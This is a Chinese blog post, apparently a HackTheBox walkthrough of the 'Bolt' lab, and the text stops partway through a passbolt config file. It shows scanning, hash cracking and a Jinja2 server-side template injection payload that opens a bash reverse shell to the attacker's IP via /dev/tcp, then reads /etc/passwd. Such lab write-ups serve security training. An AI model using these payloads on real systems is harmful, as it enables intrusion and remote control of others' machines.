@@ -1,0 +1,1166 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Bolt - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Bolt靶场信息  靶场类型  信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.114 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-04 20:07 EST War">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bolt - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Bolt靶场信息  靶场类型  信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.114 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-04 20:07 EST War">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/72b0f2b4-8266-4be1-bd28-66ac49764a2d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/c7905f20-ab98-42e1-897d-40bfd0d796b5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/de2e9987-4bad-4b45-8a95-830878efd108.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/9f180698-27ff-4f89-b98d-cc553b8ba90d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/b3557e23-74c1-4f31-9dfe-4a80680d5f82.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/31e93a3e-e33e-4a33-9ba9-dbc8709f3bf2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/dd4f952b-93e5-4790-bca0-91cb36ca119e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/b1e5ceb1-e935-4804-8058-d3c7310f12ee.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/98b50cc5-292b-44ee-b820-5456a52bdec2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/8a656953-372b-45bf-982a-42d3c6e06a58.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/3fa3fcba-3a29-41de-a2d5-36082048b465.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/6172ed51-339f-4ee8-8af0-ba599b0e21c7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/0a86f004-5a88-4612-88c9-7b822ec78b24.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/5bb947f1-58ed-417d-9ae1-13fd4b88496b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/367ca903-705e-4996-892a-e902edfe24c6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/f7d846d1-3503-4b7b-99dc-53346f1be9e1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/a98b0be8-4241-47e1-9aed-de6d085c85fb.png">
+<meta property="article:published_time" content="2022-01-17T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:41:09.819Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/72b0f2b4-8266-4be1-bd28-66ac49764a2d.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Bolt - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Bolt - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-01-17T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-01-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Bolt"><span class="post-toc-text">Hackthebox - Bolt</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#User"><span class="post-toc-text">User</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Bolt"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Bolt - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-01-17 19:38:36" datetime="2022-01-17T11:38:36.000Z"  itemprop="datePublished">2022-01-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Bolt"><a href="#Hackthebox-Bolt" class="headerlink" title="Hackthebox - Bolt"></a>Hackthebox - Bolt</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/72b0f2b4-8266-4be1-bd28-66ac49764a2d.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/c7905f20-ab98-42e1-897d-40bfd0d796b5.png" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用nmap进行端口扫描</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.114
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 20:07 EST
+Warning: 10.10.11.114 giving up on port because retransmission cap hit (10).
+Nmap scan report for bogon (10.10.11.114)
+Host is up (0.26s latency).
+Not shown: 65527 closed ports
+PORT      STATE    SERVICE  VERSION
+22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
+|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
+|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
+80/tcp    open     http     nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title:     Starter Website -  About 
+443/tcp   open     ssl/http nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Not valid before: 2021-02-24T19:11:23
+|_Not valid after:  2022-02-24T19:11:23
+15062/tcp filtered unknown
+17825/tcp filtered unknown
+37303/tcp filtered unknown
+40042/tcp filtered unknown
+63830/tcp filtered unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/4%OT=22%CT=1%CU=33320%PV=Y%DS=2%DC=T%G=Y%TM=61D4F026
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
+OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 23/tcp)
+HOP RTT       ADDRESS
+1   266.28 ms bogon (10.10.14.1)
+2   266.96 ms bogon (10.10.11.114)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 237.89 seconds
+</code></pre>
+<p>首先去看看80端口的http服务</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/de2e9987-4bad-4b45-8a95-830878efd108.png" class>
+
+<p>添加到hosts</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# echo 10.10.11.114 bolt.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>这里有个登录按钮，进去看看</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/9f180698-27ff-4f89-b98d-cc553b8ba90d.png" class>
+
+<p>尝试下有没有弱口令</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/b3557e23-74c1-4f31-9dfe-4a80680d5f82.png" class>
+
+<p>使用admin账户进行登录，提示的是密码错误，那是不是可以爆破账号呢？用admin1测试一下</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/31e93a3e-e33e-4a33-9ba9-dbc8709f3bf2.png" class>
+
+<p>是的，提示完全不一样，目前可以确定admin账号存在了</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/dd4f952b-93e5-4790-bca0-91cb36ca119e.png" class>
+
+<p>尝试注册账号却提示500，去扫个目录试试</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.114/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.114/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+contact                 [Status: 200, Size: 26293, Words: 10060, Lines: 468]
+logout                  [Status: 302, Size: 209, Words: 22, Lines: 4]
+login                   [Status: 200, Size: 9287, Words: 2135, Lines: 173]
+register                [Status: 200, Size: 11038, Words: 3053, Lines: 199]
+download                [Status: 200, Size: 18570, Words: 5374, Lines: 346]
+services                [Status: 200, Size: 22443, Words: 7170, Lines: 405]
+pricing                 [Status: 200, Size: 31731, Words: 11055, Lines: 549]
+sign-up                 [Status: 200, Size: 11038, Words: 3053, Lines: 199]
+sign-in                 [Status: 200, Size: 9287, Words: 2135, Lines: 173]
+                        [Status: 200, Size: 30347, Words: 10870, Lines: 505]
+check-email             [Status: 200, Size: 7331, Words: 1224, Lines: 147]
+:: Progress: [20116/20116] :: Job [1/1] :: 61 req/sec :: Duration: [0:03:19] :: Errors: 0 ::
+</code></pre>
+<p>都测试了一遍，暂时没什么思路，不过sign-up和sign-in页面会提示405，感觉是被什么东西过滤了，先放着不管，看看有没有其他思路吧</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/b1e5ceb1-e935-4804-8058-d3c7310f12ee.png" class>
+
+<p>在&#x2F;download目录下，咱们可以下载一个压缩文件image.tar</p>
+<p>把它下载下来看看</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/image]
+└─# ls -la
+总用量 64
+drwxr-xr-x 13 root root 4096  1月  6 01:03 .
+drwxr-xr-x  4 root root 4096  1月  6 01:03 ..
+drwxr-xr-x  2 root root 4096  3月  5  2021 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
+drwxr-xr-x  2 root root 4096  3月  5  2021 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
+drwxr-xr-x  2 root root 4096  3月  5  2021 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
+drwxr-xr-x  2 root root 4096  3月  5  2021 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
+drwxr-xr-x  2 root root 4096  3月  5  2021 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
+drwxr-xr-x  2 root root 4096  3月  5  2021 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
+drwxr-xr-x  2 root root 4096  3月  5  2021 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
+drwxr-xr-x  2 root root 4096  3月  5  2021 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
+-rw-r--r--  1 root root 3797  3月  5  2021 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
+drwxr-xr-x  2 root root 4096  3月  5  2021 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
+drwxr-xr-x  3 root root 4096  1月  6 01:03 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
+drwxr-xr-x  2 root root 4096  3月  5  2021 d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
+-rw-r--r--  1 root root 1002 12月 31  1969 manifest.json
+-rw-r--r--  1 root root  119 12月 31  1969 repositories
+</code></pre>
+<p>下载下来解压后，会有很多文件，在其中一个文件夹a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2中的layer.tar里，找到了一个文件db.sqlite3</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer]
+└─# ls -la
+总用量 32
+drwxr-xr-x 4 root root  4096  1月  6 01:03 .
+drwxr-xr-x 3 root root  4096  1月  6 01:03 ..
+-rw-r--r-- 1 root root 16384  3月  5  2021 db.sqlite3
+drwx------ 2 root root  4096  3月  5  2021 root
+drwxrwxrwt 2 root root  4096  3月  5  2021 tmp
+</code></pre>
+<p>使用sqlite3查看一下数据库</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/image]
+└─# sqlite3 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer/db.sqlite3                                                                                                                   1 ⚙
+SQLite version 3.34.1 2021-01-20 14:10:07
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; .table
+User
+sqlite&gt; select * from user;
+1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
+</code></pre>
+<p>得到了一个账号，邮箱，以及一穿密码hash</p>
+<p>使用john爆破一下密码</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+deadbolt         (?)
+1g 0:00:00:01 DONE (2022-01-06 01:11) 0.6451g/s 111483p/s 111483c/s 111483C/s debie..curtis13
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p>现在得到了账号密码</p>
+<pre><code class="bash">username = admin
+password = deadbolt
+email = admin@bolt.htb
+</code></pre>
+<p>拿着账号密码去登录后台</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/98b50cc5-292b-44ee-b820-5456a52bdec2.png" class>
+
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/8a656953-372b-45bf-982a-42d3c6e06a58.png" class>
+
+<p>在首页的位置，有一个在线聊天窗口，我感觉应该是有XSS没跑</p>
+<p>在聊天内容中提到了有其他主机，那就找一下吧，看看能不能找到</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://bolt.htb&quot; -H &quot;Host:FUZZ.bolt.htb&quot; -fs 30347
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://bolt.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.bolt.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 30347
+________________________________________________
+
+demo                    [Status: 302, Size: 219, Words: 22, Lines: 4]
+mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]
+lists                   [Status: 200, Size: 0, Words: 1, Lines: 1]
+videos                  [Status: 200, Size: 0, Words: 1, Lines: 1]
+disco                   [Status: 200, Size: 0, Words: 1, Lines: 1]
+:: Progress: [4989/4989] :: Job [1/1] :: 35 req/sec :: Duration: [0:02:34] :: Errors: 0 ::
+</code></pre>
+<p>发现两个可用子域名demo和mail，给他们加入到hosts里</p>
+<pre><code class="bash">echo 10.10.11.114 demo.bolt.htb mail.bolt.htb &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/3fa3fcba-3a29-41de-a2d5-36082048b465.png" class>
+
+<p>在demo这一个页面里发现有新的注册点，可以进行注册，但是缺少了一个邀请码</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/image]
+└─# grep -iR -A 2 &#39;invite_code&#39; 2&gt;/dev/null
+--
+41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html:            {{ form.invite_code(placeholder="Invite Code", class="form-control") }}
+41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html-            &lt;div class=&quot;input-group-append&quot;&gt;
+41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html-              &lt;div class=&quot;input-group-text&quot;&gt;
+--
+41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py:    invite_code = TextField(&#39;Invite Code&#39;, id=&#39;invite_code&#39;    , validators=[DataRequired()])
+--
+41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py:        code          = request.form[&#39;invite_code&#39;]
+41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py-        if code != &#39;XNSS-HSJW-3NGU-8XTJ&#39;:
+41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py-            return render_template(&#39;code-500.html&#39;)
+</code></pre>
+<p>显示邀请码在41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad&#x2F;app&#x2F;base&#x2F;routes.py中，去查看一下</p>
+<pre><code class="bash">if code != &#39;XNSS-HSJW-3NGU-8XTJ&#39;:
+</code></pre>
+<p>找到邀请码，去注册一个账号</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/6172ed51-339f-4ee8-8af0-ba599b0e21c7.png" class>
+
+<p>注册后登录即可，新注册的账号在demo和mail上都可以进行登录</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/0a86f004-5a88-4612-88c9-7b822ec78b24.png" class>
+
+<p>在setting处的name里，存在一个SSTI，这里测试一下</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/5bb947f1-58ed-417d-9ae1-13fd4b88496b.png" class>
+
+<p>修改后收到了邮件</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/367ca903-705e-4996-892a-e902edfe24c6.png" class>
+
+<p>点击链接确认后，仪表盘上没有任何变化，但是却收到了另一封邮件，里面显示了我们输入的结果</p>
+<p>确认存在SSTI</p>
+<blockquote>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server Side Template Injection/README.md#exploit-the-ssti-by-calling-ospopenread</a></p>
+</blockquote>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/f7d846d1-3503-4b7b-99dc-53346f1be9e1.png" class>
+
+<p>使用该poc进行利用</p>
+<img src="/2022/01/17/Hackthebox/Hackthebox-Bolt/a98b0be8-4241-47e1-9aed-de6d085c85fb.png" class>
+
+<p>成功执行命令</p>
+<p>现在构造一个poc来获得一个shell</p>
+<pre><code class="bash">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c "/bin/bash -i &>/dev/tcp/10.10.14.16/4444 <&1"').read() }} < code></&1"').read()></code></pre>
+<p>在执行poc之前，先使用nc监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.114] 47908
+bash: cannot set terminal process group (958): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bolt:~/demo$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>成功获得一个shell</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>查找一下有登陆权限的账户</p>
+<pre><code class="bash">www-data@bolt:/home$ grep &#39;bash&#39; /etc/passwd
+grep &#39;bash&#39; /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+eddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash
+clark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash
+</code></pre>
+<p>eddie和clark都有登陆权限</p>
+<p>在目录&#x2F;etc&#x2F;passbolt下发现了一个有趣的文件passbolt.php，我们去查看一下</p>
+<pre><code class="php">&lt;?php
+/**
+ * Passbolt ~ Open source password manager for teams
+ * Copyright (c) Passbolt SA (https://www.passbolt.com)
+ *
+ * Licensed under GNU Affero General Public License version 3 of the or any later version.
+ * For full copyright and license information, please see the LICENSE.txt
+ * Redistributions of files must retain the above copyright notice.
+ *
+ * @copyright     Copyright (c) Passbolt SA (https://www.passbolt.com)
+ * @license       https://opensource.org/licenses/AGPL-3.0 AGPL License
+ * @link          https://www.passbolt.com Passbolt(tm)
+ * @since         2.0.0
+ */
+/**
+ * PASSBOLT CONFIGURATION FILE
+ *
+ * This is a generated configuration file, which was generated by the passbolt web installer.
+ *
+ * To see all available options, you can refer to the default.php file, or replace this file
+ * by a copy of passbolt.default.php
+ * Do not modify default.php or you may break your upgrade process.
+ *
+ * Read more about how to install passbolt: https://www.passbolt.com/help/tech/install
+ * Any issue, check out our FAQ: https://www.passbolt.com/faq
+ * An installation issue? Ask for help to the community: https://community.passbolt.com/
+ */
+return [
+    &#39;App&#39; =&gt; [
+        // A base URL to use for absolute links.
+        // The url where the passbolt instance will be reachable to your end users.
+        // This information is need to render images in emails for example
+        &#39;fullBaseUrl&#39; =&gt; &#39;https://passbolt.bolt.htb&#39;,
+    ],
+
